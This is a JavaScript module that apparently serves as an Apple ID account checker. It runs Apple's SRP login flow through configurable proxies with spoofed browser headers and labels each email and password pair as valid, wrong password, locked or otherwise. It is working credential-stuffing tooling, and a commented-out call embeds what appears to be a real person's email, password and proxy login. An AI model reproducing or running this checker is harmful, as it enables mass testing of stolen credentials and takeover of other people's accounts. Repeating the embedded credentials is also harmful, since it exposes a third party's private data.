const cheerio = require('cheerio');
const axios = require('axios-https-proxy-fix');
const { GSASRPAuthenticator } = require('./GSASRPAuthenticator');

const instance = axios.create({
  timeout: 30000
})

const getFrameId = () => {
  for (var e = "auth-" + Math.random().toString(36).substr(2, 8), t = 1; t <= 3; t++)
    e += "-" + Math.random().toString(36).substr(2, 4);
  return e + "-" + Math.random().toString(36).substr(2, 8)
}

const initSRP = (proxy, bodyData, cancelToken) => {
  var data = JSON.stringify(bodyData);
  return new Promise((resolve, reject) => {
    let config = {
      method: 'post',
      proxy,
      cancelToken,
      maxBodyLength: Infinity,
      url: `https://idmsa.apple.com/appleauth/auth/signin/init`,
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://idmsa.apple.com',
        'Referer': 'https://idmsa.apple.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
      },
      data: data
    };

    instance.request(config)
      .then((response) => {
        resolve(response?.data)
      })
      .catch(reject);
  })
}

const loginIdApple = (proxy, proof, cancelToken) => {
  var data = JSON.stringify({
    ...proof,
    rememberMe: true,
    trustTokens: []
  });
  return new Promise((resolve, reject) => {
    let config = {
      method: 'post',
      proxy,
      cancelToken,
      maxBodyLength: Infinity,
      url: `https://idmsa.apple.com/appleauth/auth/signin/complete`,
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://idmsa.apple.com',
        'Referer': 'https://idmsa.apple.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
      },
      data: data
    };

    instance.request(config)
      .then((response) => {
        resolve({ cookies: response?.headers['set-cookie'], headers: response?.headers })
      })
      .catch((error) => {
        if (error?.response?.status == 409) {
          resolve("CHBM")
        } else if (error?.response?.status == 401) {
          resolve("sai pass")
        } else if (error?.response?.status == 412) {
          resolve({ cookies: error?.response?.headers['set-cookie'], headers: error?.response?.headers })
        } else if (error?.response?.status == 403) {
          resolve('locked')
        } else {
          reject(error)
        }
      });
  })
}

const getConfigRequest = (proxy, frame_id, cancelToken) => {
  const url = `https://idmsa.apple.com/appleauth/auth/authorize/signin?frame_id=${frame_id}&language=en_us&skVersion=7&iframeId=${frame_id}&client_id=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&redirect_uri=https://appleid.apple.com&response_type=code&response_mode=web_message&state=${frame_id}&authVersion=latest`;
  return new Promise((resolve, reject) => {
    var options = {
      'method': 'GET',
      proxy,
      cancelToken,
      'url': url,
      'headers': {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
      }
    };
    instance.request(options)
      .then(function (response) {
        const $ = cheerio.load(response.data);
        let id = null;
        $('.boot_args').each((index, element) => {
          const text = $(element).text();
          if (text.includes("appleOAuth")) {
            const jsonObj = JSON.parse(text);
            id = jsonObj?.direct?.appleOAuth?.requestor?.id
          }
        })
        resolve(id)
      })
      .catch(reject);
  })
}

// Login checks stop after authentication; account repair actions are not invoked.
const CHBMAppleID = async (email, pass, proxyString, options = {}) => {
  const result = (status, note, details = {}) => ({ mail: email, pass, status, ...(note && { note }), ...details });
  const unchecked = (reason, retryable = false) => result('not checked', undefined, { reason, retryable });
  let proxy = false;
  if (proxyString) {
    const parts = String(proxyString).split(':');
    if (![2, 4].includes(parts.length) || !parts[0] || !/^\d+$/.test(parts[1]) ||
        Number(parts[1]) < 1 || Number(parts[1]) > 65535 ||
        (parts.length === 4 && (!parts[2] || !parts[3]))) return result('not checked', 'invalid proxy');
    proxy = { protocol: 'http', host: parts[0], port: Number(parts[1]),
      ...(parts.length === 4 && { auth: { username: parts[2], password: parts[3] } }) };
  }
  const source = axios.CancelToken.source();
  let expired = false;
  const timeout = setTimeout(() => { expired = true; source.cancel('Login deadline exceeded'); }, options.timeoutMs || 90000);
  try {
    const widgetKey = await getConfigRequest(proxy, getFrameId(), source.token);
    if (expired) return unchecked('timeout', true);
    if (!widgetKey) return unchecked('unknown_response');
    const authenticator = new GSASRPAuthenticator(email);
    const initData = await authenticator.getInit();
    if (expired) return unchecked('timeout', true);
    const initResp = await initSRP(proxy, initData, source.token);
    if (expired) return unchecked('timeout', true);
    if (!initResp) return unchecked('unknown_response');
    const proof = await authenticator.getComplete(pass, initResp);
    if (expired) return unchecked('timeout', true);
    const completeResp = await loginIdApple(proxy, proof, source.token);
    if (expired) return unchecked('timeout', true);
    if (!completeResp) return unchecked('unknown_response');
    if (typeof completeResp === 'string') return result('checked', completeResp);
    return result('checked', 'successfully');
  } catch (error) {
    if (expired || ['ECONNABORTED', 'ETIMEDOUT', 'ESOCKETTIMEDOUT'].includes(error?.code)) return unchecked('timeout', true);
    const status = error?.response?.status;
    if (status === 503) return unchecked('service_unavailable', true);
    if (status === 407) return unchecked('proxy_error', true);
    if (!error?.response && (error?.request || ['ECONNRESET', 'ECONNREFUSED', 'ENOTFOUND', 'EAI_AGAIN', 'ENETUNREACH', 'EHOSTUNREACH', 'EPIPE', 'ERR_NETWORK', 'ERR_PROXY_CONNECTION_FAILED'].includes(error?.code))) {
      return unchecked('network_error', true);
    }
    return unchecked('unknown_response');
  } finally {
    clearTimeout(timeout);
  }
};

// (async () => {
//   const result = await CHBMAppleID('emad_ayed-77@hotmail.com', 'WCH24q712@azms', 'as.lumiproxy.io:5888:lumi-lumip3jxa8qy4v9:NUZnacBTmBasd123');
//   console.log(result);
// })();

module.exports = { CHBMAppleID };
